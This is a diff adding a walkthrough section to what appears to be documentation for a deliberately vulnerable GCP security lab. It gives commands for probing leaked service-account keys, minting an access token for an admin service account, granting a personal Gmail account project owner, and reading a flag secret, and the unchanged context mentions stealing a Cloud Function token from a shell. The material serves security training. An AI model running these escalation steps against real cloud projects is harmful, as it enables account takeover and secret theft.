@@ -138,6 +138,69 @@ The service account already exists (perhaps from a previous failed destroy). Imp
 terraform import google_service_account.<name> projects/<PROJECT_ID>/serviceAccounts/<EMAIL>
 ```
 
+### Service account impersonation via Token Creator (lab-03)
+
+Lab-03 Stage 2 requires generating an access token for `admin-owner` SA using the `token-generator` credential.
+
+**Step 1 — Activate each credential and probe for the valid one**
+
+```bash
+# Iterate through the 10 keys in service-accounts.json.
+# The valid one (position 5) can list service accounts; the rest get 403.
+gcloud auth activate-service-account --key-file=<KEY_N>.json
+gcloud iam service-accounts list --project=<ADMIN_PROJECT_ID>
+```
+
+Only the `token-generator` key succeeds. Note its email from the output.
+
+**Step 2 — Generate an access token for admin-owner SA**
+
+```bash
+# While authenticated as token-generator:
+curl -s -X POST \
+  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
+  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<ADMIN_OWNER_EMAIL>:generateAccessToken" \
+  -H "Content-Type: application/json" \
+  -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}'
+```
+
+Copy the returned `accessToken` value.
+
+**Step 3 — Use the token with gcloud**
+
+```bash
+gcloud config set auth/access_token <ADMIN_OWNER_ACCESS_TOKEN>
+# Verify — should return admin-owner SA bindings:
+gcloud projects get-iam-policy <ADMIN_PROJECT_ID>
+```
+
+**Step 4 — Grant personal Gmail account roles/owner (Stage 3)**
+
+```bash
+gcloud projects add-iam-policy-binding <ADMIN_PROJECT_ID> \
+  --member="user:<YOUR_GMAIL>" \
+  --role="roles/owner"
+# This uses admin-owner's projectIamAdmin role.
+# Note: admin-owner cannot enable APIs (role excludes serviceusage.services.enable).
+```
+
+**Step 5 — Read the flag secret (Stage 5)**
+
+After enabling the Secret Manager API via the GCP Console (Stage 4):
+
+```bash
+# Still using the admin-owner access token:
+gcloud secrets versions access latest \
+  --secret=<DEPLOYMENT_UID>-admin-flag \
+  --project=<ADMIN_PROJECT_ID>
+```
+
+> In org deployments (`enable_deny_policies = true`), the `flag_secret_guard` Deny Policy blocks the Gmail project owner from reading the secret. The `admin-owner` SA token is the only identity that succeeds.
+
+> Access tokens expire after ~1 hour. Regenerate using Step 2 if commands return 401.
+
+---
+
 ### Metadata token inside the Cloud Function (lab-02)
 
 To steal the Cloud Function's runtime SA token from within the RCE shell:
